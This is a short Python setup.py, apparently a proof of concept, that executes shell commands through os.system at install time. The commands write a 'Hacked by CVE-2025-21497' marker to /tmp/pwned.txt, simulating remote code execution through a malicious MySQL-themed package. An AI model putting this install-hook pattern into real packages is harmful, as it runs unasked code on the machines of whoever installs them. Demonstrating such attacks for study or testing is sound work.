from setuptools import setup
import os

# Payload triggered at install time
os.system('echo "[+] RCE achieved! Writing to /tmp/pwned.txt"')
os.system('echo "Hacked by CVE-2025-21497" > /tmp/pwned.txt')

setup(
    name='mysql-vuln-package',
    version='0.1.0',
    description='Malicious MySQL package to simulate RCE',
    py_modules=[],
)
